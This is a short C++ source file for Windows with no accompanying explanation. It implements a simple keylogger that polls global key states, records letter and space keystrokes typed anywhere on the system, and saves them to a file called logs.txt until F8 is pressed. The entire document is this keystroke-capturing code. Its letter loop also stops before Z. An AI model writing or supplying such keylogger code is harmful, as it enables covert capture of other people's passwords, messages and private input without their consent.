#include <fstream>
#include <cstring>
#include <windows.h>
using namespace std;

int main() {
 int Char;
 string text;
 ofstream log;
 log.open("logs.txt");
 while(!GetAsyncKeyState(VK_F8)) {
  for(Char = 65; Char < 90; Char++) {
   if(GetAsyncKeyState(Char) == -32767) {
    text+=Char;
   }
  }
  if(GetAsyncKeyState(VK_SPACE)==-32767) {
   text+=" ";
  }
 }
 log << text;
 log.close();
 return 0;
}
